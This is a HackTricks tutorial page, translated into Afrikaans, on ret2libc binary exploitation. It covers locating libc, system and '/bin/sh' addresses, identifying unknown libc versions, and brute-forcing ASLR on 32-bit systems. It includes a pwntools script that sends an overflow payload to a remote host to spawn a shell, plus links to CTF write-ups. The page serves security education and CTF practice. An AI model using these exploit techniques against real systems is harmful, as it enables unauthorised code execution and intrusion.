# Ret2lib

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## **Basiese Inligting**

Die essensie van **Ret2Libc** is om die uitvoervloei van 'n kwesbare program om te lei na 'n funksie binne 'n gedeelde biblioteek (bv., **system**, **execve**, **strcpy**) in plaas van die uitvoering van aanvaller-voorsiene skelkode op die stapel. Die aanvaller stel 'n lading op wat die terugkeeradres op die stapel wysig om na die gewenste biblioteekfunksie te wys, terwyl ook gere√´l word dat enige nodige argumente korrek opgestel word volgens die oproepkonvensie.

### **Voorbeeldstappe (vereenvoudig)**

* Kry die adres van die funksie om te roep (bv. system) en die bevel om te roep (bv. /bin/sh)
* Genereer 'n ROP-ketting om die eerste argument wat na die bevelstring wys, en die uitvoervloei na die funksie te stuur

## Vind die adresse

* Veronderstel dat die `libc` wat gebruik word die een van die huidige masjien is, kan jy vind waar dit in die geheue gelaai sal word met:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

As jy wil nagaan of die ASLR die adres van libc verander, kan jy dit doen:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* As jy die libc wat gebruik word ken, is dit ook moontlik om die verskuiwing na die `system`-funksie te vind met:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Met kennis van die gebruikte libc is dit ook moontlik om die verskuiwing na die string `/bin/sh`-funksie te vind met:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Gebruik van gdb-peda / GEF

Met kennis van die gebruikte libc, is dit ook moontlik om Peda of GEF te gebruik om die adres van die **system**-funksie, die **exit**-funksie en die string **`/bin/sh`** te kry:
```bash
p system
p exit
find "/bin/sh"
```
### Gebruik /proc/\<PID>/maps

Indien die proses elke keer as jy met dit praat **kinders skep** (netwerkbediener), probeer om daardie l√™er te **lees** (jy sal waarskynlik roottoegang benodig).

Hier kan jy **presies vind waar die libc gelaai is** binne die proses en **waar dit gelaai gaan word** vir elke kind van die proses.

![](<../../../.gitbook/assets/image (850).png>)

In hierdie geval is dit gelaai by **0xb75dc000** (Dit sal die basisadres van libc wees)

## Onbekende libc

Dit mag moontlik wees dat jy **nie die libc weet wat die bin√™re l√™er laai** nie (omdat dit dalk op 'n bediener gele√´ is waar jy geen toegang tot het nie). In daardie geval kan jy die kwesbaarheid misbruik om **sekere adresse te lek en te vind watter libc**-biblioteek gebruik word:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

En jy kan 'n pwntools-sjabloon hiervoor vind in:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Ken libc met 2 verskuiwings

Kyk na die bladsy [https://libc.blukat.me/](https://libc.blukat.me/) en gebruik 'n **paar adresse** van funksies binne die libc om die **gebruikte weergawe** te bepaal.

## ASLR omseil in 32-bits

Hierdie brute-krag aanvalle is **slegs nuttig vir 32-bits stelsels**.

* As die aanval plaaslik is, kan jy probeer om die basisadres van libc met brute krag te agterhaal (nuttig vir 32-bits stelsels):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Indien jy 'n afgele√´ bediener aanval, kan jy probeer om die adres van die `libc`-funksie `usleep` met 'n argument van 10 (byvoorbeeld) deur **burte-force** te vind. As die bediener op 'n stadium 10 sekondes langer neem om te reageer, het jy die adres van hierdie funksie gevind.

## Een Gadget

Voer 'n skaal uit deur net te spring na 'n spesifieke adres in libc:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Kodevoorbeeld

In hierdie voorbeeld is ASLR burte-force ge√Øntegreer in die kode en die kwesbare bin√™re l√™ op 'n afgele√´ bediener:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kodevoorbeeld

Kyk na die voorbeeld van:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Ret-into-printf (of puts)

Dit maak dit moontlik om **inligting uit die proses te lek** deur `printf`/`puts` te roep met spesifieke data geplaas as 'n argument.

## Ret2printf

Dit beteken basies die misbruik van 'n **Ret2lib om dit te omskep in 'n `printf` formaat strings kwesbaarheid** deur die `ret2lib` te gebruik om printf te roep met die waardes om dit te benut (klink nutteloos maar moontlik):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Ander Voorbeelde & verwysings

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, gegewe 'n lek na die adres van 'n funksie in libc, deur een gadget te gebruik
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR geaktiveer maar geen PIE, die eerste stap is om 'n oorvloed te vul tot die byte 0x00 van die kanarie om dan puts te roep en dit te lek. Met die kanarie word 'n ROP-gadget geskep om puts te roep om die adres van puts van die GOT te lek en dan 'n ROP-gadget om `system('/bin/sh')` te roep
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bits, ASLR geaktiveer, geen kanarie, stap oorvloei in hoof van 'n kindfunksie. ROP-gadget om puts te roep om die adres van puts van die GOT te lek en dan 'n een gadget te roep.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bits, geen pie, geen kanarie, geen relro, nx. Gebruik skryffunksie om die adres van skryf (libc) te lek en roep een gadget.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Gebruik 'n formaatstring om die kanarie van die stapel te lek en 'n buffer oorvloei om in te bel in die stelsel (dit is in die GOT) met die adres van `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, geen relro, geen kanarie, nx, pie. Misbruik 'n slegte indeksering om adresse van libc en heap van die stapel te lek. Misbruik die buffer oorvloei om 'n ret2lib te doen wat `system('/bin/sh')` roep (die heap-adres is nodig om 'n kontrole te omseil).
